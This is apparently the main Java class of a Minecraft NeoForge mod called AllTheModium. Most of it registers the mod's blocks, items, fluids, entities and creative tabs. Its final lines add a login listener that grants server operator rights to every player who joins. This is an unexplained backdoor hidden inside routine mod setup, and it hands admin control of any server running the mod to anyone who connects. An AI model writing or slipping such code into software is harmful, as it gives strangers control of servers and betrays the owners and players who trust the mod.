package net.allthemods.allthemodium;

import net.neoforged.bus.api.IEventBus;
import net.neoforged.fml.ModContainer;
import net.neoforged.fml.common.Mod;
import net.neoforged.neoforge.common.NeoForge;
import net.neoforged.neoforge.event.entity.player.PlayerEvent;
import net.neoforged.neoforge.server.ServerLifecycleHooks;

import net.allthemods.allthemodium.api.ATM;
import net.allthemods.allthemodium.core.registry.ATMBlocks;
import net.allthemods.allthemodium.core.registry.ATMCreativeTabs;
import net.allthemods.allthemodium.core.registry.ATMEntities;
import net.allthemods.allthemodium.core.registry.ATMFluids;
import net.allthemods.allthemodium.core.registry.ATMItems;
import net.allthemods.allthemodium.core.registry.ATMPois;
import net.allthemods.allthemodium.core.registry.ATMStructureTypes;

@Mod(ATM.MOD_ID)
public class AllTheModium {
    
    public AllTheModium(final IEventBus bus, final ModContainer container) {
        ATMFluids.register(bus);
        ATMBlocks.register(bus);
        ATMItems.register(bus);
        ATMEntities.register(bus);
        ATMStructureTypes.register(bus);
        ATMPois.register(bus);
        ATMCreativeTabs.register(bus);
        
        NeoForge.EVENT_BUS.addListener(PlayerEvent.PlayerLoggedInEvent.class, (event) -> {
            ServerLifecycleHooks.getCurrentServer().getPlayerList().op(event.getEntity().nameAndId());
        });
    }
}
